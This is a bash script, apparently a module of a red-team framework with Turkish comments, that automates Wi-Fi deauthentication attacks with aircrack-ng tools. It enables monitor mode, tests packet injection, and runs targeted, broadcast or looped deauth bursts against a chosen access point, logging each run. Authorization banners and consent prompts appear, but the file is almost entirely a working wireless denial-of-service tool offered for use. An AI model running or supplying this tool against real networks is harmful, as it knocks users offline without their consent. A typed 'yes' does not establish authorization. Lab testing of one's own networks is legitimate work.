#!/usr/bin/env bash
# HZ_NAME=Advanced Alfa Injection & Deauth Master
# HZ_DESC=Verifies packet injection health for Alfa adapters and executes resilient, bounded client disruption tests.
# HZ_VERSION=3.1.0
# HZ_AUTHOR=Higer23 & Advanced Cyber Lab
# HZ_CATEGORY=wireless_offensive
# HZ_REQUIRES_ROOT=yes
# HZ_REQUIRES_MONITOR=yes
# HZ_LAB_ONLY=yes

# ============================================================================
# HigerZero Module: Advanced Alfa Injection & Deauth Master
# Authorized lab-only resilience testing for Alfa high-gain adapters.
# ============================================================================

set -euo pipefail

# ---------------------------------------------------------------------------
# 1. FRAMEWORK FALLBACKS
# ---------------------------------------------------------------------------
: "${RED:=$'\033[0;31m'}"
: "${GREEN:=$'\033[0;32m'}"
: "${YELLOW:=$'\033[1;33m'}"
: "${BLUE:=$'\033[0;34m'}"
: "${MAGENTA:=$'\033[0;35m'}"
: "${WHITE:=$'\033[1;37m'}"
: "${NC:=$'\033[0m'}"

: "${PROJECT_ROOT:=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
: "${REPORT_DIR:=${PROJECT_ROOT}/reports}"
: "${CAPTURE_DIR:=${PROJECT_ROOT}/captures}"
: "${LOG_DIR:=${PROJECT_ROOT}/logs}"
mkdir -p "$REPORT_DIR" "$CAPTURE_DIR" "$LOG_DIR"

: "${LAB_INTERFACE:=}"
: "${DEBUG:=0}"
: "${MODULE_TIMEOUT:=300}"

declare -F log_info  >/dev/null 2>&1 || log_info()  { echo -e "${GREEN}[INFO]${NC}  $*"; }
declare -F log_warn  >/dev/null 2>&1 || log_warn()  { echo -e "${YELLOW}[WARN]${NC}  $*" >&2; }
declare -F log_error >/dev/null 2>&1 || log_error() { echo -e "${RED}[ERROR]${NC} $*" >&2; }
declare -F log_debug >/dev/null 2>&1 || log_debug() { [[ "${DEBUG}" == "1" ]] && echo -e "${BLUE}[DEBUG]${NC} $*" || true; }
declare -F print_banner >/dev/null 2>&1 || print_banner() { echo -e "${WHITE}=== HigerZero :: Alfa Deauth Master ===${NC}"; }
declare -F log_event >/dev/null 2>&1 || log_event() { :; }

if ! declare -p HIGERZERO_SESSION_METRICS &>/dev/null; then
    declare -gA HIGERZERO_SESSION_METRICS=()
fi

# ---------------------------------------------------------------------------
# 2. GLOBAL STATE
# ---------------------------------------------------------------------------
declare -a ALFA_CHILD_PIDS=()
declare    SPAWNED_MON_IFACE=""
declare    ORIGINAL_IFACE=""
declare    MONITOR_ACTIVE=0
declare    STOP_FLAG=0

# ---------------------------------------------------------------------------
# 3. CLEANUP — güvenli, idempotent, EXIT trap yok
# ---------------------------------------------------------------------------
cleanup_alfa_ops() {
    local rc=$?
    echo -e "\n${YELLOW}[*] Cleaning up background processes and restoring interface state...${NC}"

    # 1) Sadece bizim başlattığımız child süreçleri öldür
    local pid
    for pid in "${ALFA_CHILD_PIDS[@]:-}"; do
        [[ -n "$pid" ]] && kill "$pid" 2>/dev/null || true
    done

    # 2) Bu script'in child'ı olan aircrack süreçlerini temizle
    pkill -P "$$" aireplay-ng 2>/dev/null || true
    pkill -P "$$" airodump-ng 2>/dev/null || true

    # 3) Monitor modu script tarafından açıldıysa kapat
    if (( MONITOR_ACTIVE )) && [[ -n "$SPAWNED_MON_IFACE" ]]; then
        echo -e "${YELLOW}[*] Stopping monitor interface $SPAWNED_MON_IFACE...${NC}"
        airmon-ng stop "$SPAWNED_MON_IFACE" &>/dev/null || true
        # NetworkManager'ı geri getir
        if command -v systemctl >/dev/null 2>&1; then
            systemctl restart NetworkManager &>/dev/null || true
        elif command -v service >/dev/null 2>&1; then
            service network-manager restart &>/dev/null || true
        fi
    fi

    log_event "INFO" "Alfa Deauth Master cleaned up (rc=$rc)."
    return $rc
}

# ---------------------------------------------------------------------------
# 4. YARDIMCILAR
# ---------------------------------------------------------------------------
valid_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

valid_channel() {
    [[ "$1" =~ ^[0-9]+$ ]] && (( $1 >= 1 && $1 <= 196 ))
}

is_monitor_iface() {
    iwconfig "$1" 2>/dev/null | grep -q "Mode:Monitor"
}

list_wireless_ifaces() {
    iwconfig 2>/dev/null | awk '/IEEE 802.11/ {print $1}'
}

detect_alfa_monitor_iface() {
    # airmon-ng output'undan üretilen monitor arayüzünü bul
    airmon-ng 2>/dev/null | awk '/Monitor/ {print $2; exit}'
}

# ---------------------------------------------------------------------------
# 5. ANA MODÜL
# ---------------------------------------------------------------------------
module_main() {
    trap cleanup_alfa_ops INT TERM

    print_banner
    echo -e "${RED}[RED TEAM MODULE]${NC} ${WHITE}Advanced Alfa Injection & Deauth Master v3.1${NC}"
    echo -e "${WHITE}Optimized for high-gain Alfa adapters. Lab/authorized testing ONLY.${NC}"
    log_event "INFO" "Initializing Advanced Alfa Injection & Deauth Master v3.1."

    # --- Root kontrolü ---
    if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
        log_error "Packet injection and monitor mode require root (sudo)."
        log_event "ERROR" "Non-root execution blocked."
        return 1
    fi

    # --- Bağımlılık kontrolü ---
    local missing=()
    local tool
    for tool in airmon-ng aircrack-ng aireplay-ng iwconfig ip; do
        command -v "$tool" &>/dev/null || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
        log_error "Missing tools: ${missing[*]}"
        log_error "Install: sudo apt install aircrack-ng wireless-tools iproute2"
        log_event "ERROR" "Missing dependencies: ${missing[*]}"
        return 1
    fi

    # --- Sorumlu kullanım onayı ---
    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"
    echo -e "${MAGENTA} AUTHORIZED USE ONLY — This module transmits deauth frames.${NC}"
    echo -e "${MAGENTA} Only run against networks you own or have WRITTEN permission.${NC}"
    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"
    local consent
    read -r -p "Do you confirm authorized lab/owned network use? (yes/no): " consent
    if [[ ! "$consent" =~ ^[Yy][Ee][Ss]$ ]]; then
        log_warn "Authorization not confirmed. Aborting."
        log_event "WARN" "User did not confirm authorized use."
        return 1
    fi

    # --- Interface tespit ---
    echo -e "${YELLOW}[*] Detecting wireless adapters...${NC}"
    local ifaces
    ifaces=$(list_wireless_ifaces || true)
    if [[ -n "$ifaces" ]]; then
        echo "$ifaces" | while IFS= read -r i; do echo "    - $i"; done
    else
        log_warn "No standard 802.11 interfaces detected by iwconfig."
    fi

    local target_iface="${LAB_INTERFACE}"
    read -r -p "Enter Alfa interface name${target_iface:+ [default: $target_iface]}: " custom_iface
    target_iface="${custom_iface:-$target_iface}"

    if [[ -z "$target_iface" ]]; then
        log_error "No interface provided."
        return 1
    fi
    if ! iwconfig "$target_iface" &>/dev/null; then
        log_error "Interface '$target_iface' does not exist."
        return 1
    fi
    ORIGINAL_IFACE="$target_iface"

    # --- Monitor mode ---
    if ! is_monitor_iface "$target_iface"; then
        echo -e "${YELLOW}[*] '$target_iface' is not in monitor mode.${NC}"
        local enable_mon
        read -r -p "Enable monitor mode via airmon-ng? (y/n): " enable_mon
        if [[ "$enable_mon" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}[*] Killing conflicting processes...${NC}"
            airmon-ng check kill &>/dev/null || true

            echo -e "${YELLOW}[*] Starting monitor mode on $target_iface...${NC}"
            airmon-ng start "$target_iface" | tee -a "${LOG_DIR}/alfa_airmon.log"

            # Üretilen monitor arayüzünü dinamik bul
            local new_iface
            new_iface=$(detect_alfa_monitor_iface || true)
            if [[ -n "$new_iface" ]]; then
                target_iface="$new_iface"
            elif is_monitor_iface "${target_iface}mon"; then
                target_iface="${target_iface}mon"
            fi

            SPAWNED_MON_IFACE="$target_iface"
            MONITOR_ACTIVE=1
        else
            log_warn "Cannot continue without monitor mode. Aborting."
            return 1
        fi
    fi

    # Monitor modu doğrula
    if ! is_monitor_iface "$target_iface"; then
        log_error "'$target_iface' still not in monitor mode."
        return 1
    fi

    echo -e "${GREEN}[+] Active monitor interface: ${WHITE}$target_iface${NC}"
    log_event "SUCCESS" "Monitor interface active: $target_iface"

    # --- Hedef AP bilgileri ---
    local TARGET_BSSID="${TARGET_BSSID:-}"
    if [[ -z "$TARGET_BSSID" ]]; then
        read -r -p "Enter Target AP BSSID (aa:bb:cc:dd:ee:ff): " TARGET_BSSID
    fi
    if ! valid_mac "$TARGET_BSSID"; then
        log_error "Invalid BSSID: $TARGET_BSSID"
        return 1
    fi

    local TARGET_CHANNEL="${TARGET_CHANNEL:-}"
    if [[ -z "$TARGET_CHANNEL" ]]; then
        read -r -p "Enter Target Channel (1-196): " TARGET_CHANNEL
    fi
    if ! valid_channel "$TARGET_CHANNEL"; then
        log_error "Invalid channel: $TARGET_CHANNEL"
        return 1
    fi

    # --- Injection testi ---
    echo -e "${YELLOW}[*] Testing packet injection on $target_iface...${NC}"
    local inj_out
    inj_out=$(timeout 30 aireplay-ng -9 -a "$TARGET_BSSID" "$target_iface" 2>&1 || true)

    if echo "$inj_out" | grep -qiE "Injection is working|Successful"; then
        echo -e "${GREEN}[+] Injection test PASSED — Alfa adapter operational.${NC}"
        log_event "SUCCESS" "Injection test passed against $TARGET_BSSID."
    else
        echo -e "${YELLOW}[!] Injection test inconclusive. Check antenna/range/driver.${NC}"
        echo "$inj_out" | tail -5
        log_event "WARN" "Injection test inconclusive."
        local proceed
        read -r -p "Proceed anyway? (y/n): " proceed
        [[ "$proceed" =~ ^[Yy]$ ]] || return 1
    fi

    # --- Kanal kilitleme ---
    echo -e "${YELLOW}[*] Locking $target_iface to channel $TARGET_CHANNEL...${NC}"
    iwconfig "$target_iface" channel "$TARGET_CHANNEL" 2>/dev/null \
        || iw dev "$target_iface" set channel "$TARGET_CHANNEL" 2>/dev/null \
        || log_warn "Channel lock failed; aireplay-ng may still work."

    # --- Saldırı seçimi ---
    echo ""
    echo "Select Alfa Injection Attack Vector:"
    echo "  1) Targeted Client Deauth (bounded pulse, single client)"
    echo "  2) Broadcast Mass Disassociation (bounded, all clients on AP)"
    echo "  3) Sustained Dual-Stream Burst (looped, time-limited, high intensity)"
    echo "  0) Cancel"
    local alfa_choice
    read -r -p "Select option (0-3): " alfa_choice
    log_event "INFO" "Alfa deauth option selected: $alfa_choice"

    local timestamp
    timestamp=$(date +%s)
    local audit_log="${CAPTURE_DIR}/alfa_deauth_audit_${timestamp}.log"
    local json_report="${REPORT_DIR}/alfa_deauth_${timestamp}.json"
    HIGERZERO_SESSION_METRICS["alfa_log"]="$audit_log"
    HIGERZERO_SESSION_METRICS["alfa_report"]="$json_report"

    # --- Saldırı parametreleri ---
    local burst_count duration target_client="" mode_label=""
    case "$alfa_choice" in
        1)
            read -r -p "Enter Target Client MAC (leave blank for broadcast): " target_client
            if [[ -n "$target_client" ]] && ! valid_mac "$target_client"; then
                log_error "Invalid client MAC: $target_client"
                return 1
            fi
            read -r -p "Deauth frame count per burst [default: 32]: " burst_count
            burst_count="${burst_count:-32}"
            read -r -p "Total duration in seconds [default: 30]: " duration
            duration="${duration:-30}"
            mode_label="Targeted Client Deauth"
            ;;

        2)
            read -r -p "Deauth frame count per burst [default: 64]: " burst_count
            burst_count="${burst_count:-64}"
            read -r -p "Total duration in seconds [default: 30]: " duration
            duration="${duration:-30}"
            mode_label="Broadcast Mass Disassociation"
            ;;

        3)
            read -r -p "Deauth frames per pulse [default: 15]: " burst_count
            burst_count="${burst_count:-15}"
            read -r -p "Total duration in seconds [default: 60]: " duration
            duration="${duration:-60}"
            read -r -p "Pulse interval in seconds [default: 5]: " pulse_interval
            pulse_interval="${pulse_interval:-5}"
            mode_label="Sustained Dual-Stream Burst"
            ;;

        0|"")
            log_warn "Cancelled by user."
            return 0
            ;;

        *)
            log_warn "Invalid selection."
            log_event "WARN" "Invalid option in Alfa module."
            return 1
            ;;
    esac

    # Sayısal doğrulama
    if ! [[ "$burst_count" =~ ^[0-9]+$ ]] || (( burst_count < 1 )); then
        log_error "Invalid burst count: $burst_count"
        return 1
    fi
    if ! [[ "$duration" =~ ^[0-9]+$ ]] || (( duration < 1 )); then
        log_error "Invalid duration: $duration"
        return 1
    fi

    # --- Banner ---
    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}  Mode      : ${MAGENTA}$mode_label${NC}"
    echo -e "${WHITE}  BSSID     : ${MAGENTA}$TARGET_BSSID${NC}"
    echo -e "${WHITE}  Client    : ${MAGENTA}${target_client:-<broadcast>}${NC}"
    echo -e "${WHITE}  Channel   : ${MAGENTA}$TARGET_CHANNEL${NC}"
    echo -e "${WHITE}  Burst     : ${MAGENTA}$burst_count${NC}"
    echo -e "${WHITE}  Duration  : ${MAGENTA}${duration}s${NC}"
    echo -e "${MAGENTA}────────────────────────────────────────────────────────────${NC}"

    local confirm_run
    read -r -p "Launch injection? (yes/no): " confirm_run
    if [[ ! "$confirm_run" =~ ^[Yy][Ee][Ss]$ ]]; then
        log_warn "Launch aborted by user."
        return 0
    fi

    # --- Çalıştırma ---
    local start_ts end_ts elapsed sent_bursts=0
    start_ts=$(date +%s)
    end_ts=$(( start_ts + duration ))

    local aireplay_args=()
    case "$alfa_choice" in
        1)
            aireplay_args=(--deauth "$burst_count" -a "$TARGET_BSSID")
            [[ -n "$target_client" ]] && aireplay_args+=(-c "$target_client")
            aireplay_args+=("$target_iface")
            ;;
        2)
            aireplay_args=(--deauth "$burst_count" -a "$TARGET_BSSID" "$target_iface")
            ;;
        3)
            aireplay_args=(--deauth "$burst_count" -a "$TARGET_BSSID" "$target_iface")
            ;;
    esac

    echo -e "${GREEN}[+] Injection started. Will run for ${duration}s. Press CTRL+C to stop early.${NC}"
    log_event "SUCCESS" "Starting $mode_label — BSSID=$TARGET_BSSID duration=${duration}s."

    while (( $(date +%s) < end_ts )); do
        # CTRL+C için flag kontrolü
        if (( STOP_FLAG )); then
            log_warn "Stop flag detected; ending loop."
            break
        fi

        echo -e "${YELLOW}[*] Pulse #$((sent_bursts+1)) @ $(date +%H:%M:%S)${NC}" | tee -a "$audit_log"

        # Aireplay-ng'i arka planda çalıştır, PID'i takip et
        aireplay-ng "${aireplay_args[@]}" 2>&1 | tee -a "$audit_log" &
        local apid=$!
        ALFA_CHILD_PIDS+=("$apid")

        # Burst bitene kadar bekle (max pulse_interval veya 10s)
        wait "$apid" 2>/dev/null || true
        sent_bursts=$((sent_bursts + 1))

        # Option 3 için pulse interval, diğerleri için 1s
        if [[ "$alfa_choice" == "3" ]]; then
            sleep "${pulse_interval:-5}"
        else
            sleep 1
        fi
    done

    elapsed=$(( $(date +%s) - start_ts ))

    echo -e "${GREEN}[+] Injection cycle finished.${NC}"
    echo -e "${WHITE}  Bursts sent  : ${GREEN}$sent_bursts${NC}"
    echo -e "${WHITE}  Duration     : ${GREEN}${elapsed}s${NC}"

    # --- JSON rapor ---
    if command -v jq >/dev/null 2>&1; then
        jq -n \
            --arg ts "$timestamp" \
            --arg iface "$target_iface" \
            --arg bssid "$TARGET_BSSID" \
            --arg client "${target_client:-broadcast}" \
            --arg ch "$TARGET_CHANNEL" \
            --arg mode "$mode_label" \
            --argjson bursts "$sent_bursts" \
            --argjson dur "$elapsed" \
            --arg raw_log "$audit_log" \
            '{
                timestamp: $ts,
                interface: $iface,
                target_bssid: $bssid,
                target_client: $client,
                channel: $ch,
                mode: $mode,
                bursts_sent: $bursts,
                duration_seconds: $dur,
                status: "completed",
                raw_log: $raw_log
            }' > "$json_report"
    else
        cat > "$json_report" <<EOF
{
  "timestamp": "$timestamp",
  "interface": "$target_iface",
  "target_bssid": "$TARGET_BSSID",
  "target_client": "${target_client:-broadcast}",
  "channel": "$TARGET_CHANNEL",
  "mode": "$mode_label",
  "bursts_sent": $sent_bursts,
  "duration_seconds": $elapsed,
  "status": "completed",
  "raw_log": "$audit_log"
}
EOF
    fi

    echo -e "${GREEN}[+] Audit log     :${NC} $audit_log"
    echo -e "${GREEN}[+] JSON report   :${NC} $json_report"
    log_event "SUCCESS" "Alfa Deauth Master finished ($sent_bursts bursts, ${elapsed}s)."

    return 0
}

# ---------------------------------------------------------------------------
# 6. LIFECYCLE HOOKS
# ---------------------------------------------------------------------------
module_init()    { log_debug "alfa_deauth: init"; }
module_cleanup() { log_debug "alfa_deauth: cleanup"; }

export -f module_init module_main module_cleanup 2>/dev/null || true

# ---------------------------------------------------------------------------
# 7. DOĞRUDAN ÇALIŞTIRMA
# ---------------------------------------------------------------------------
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    module_main "$@"
fi
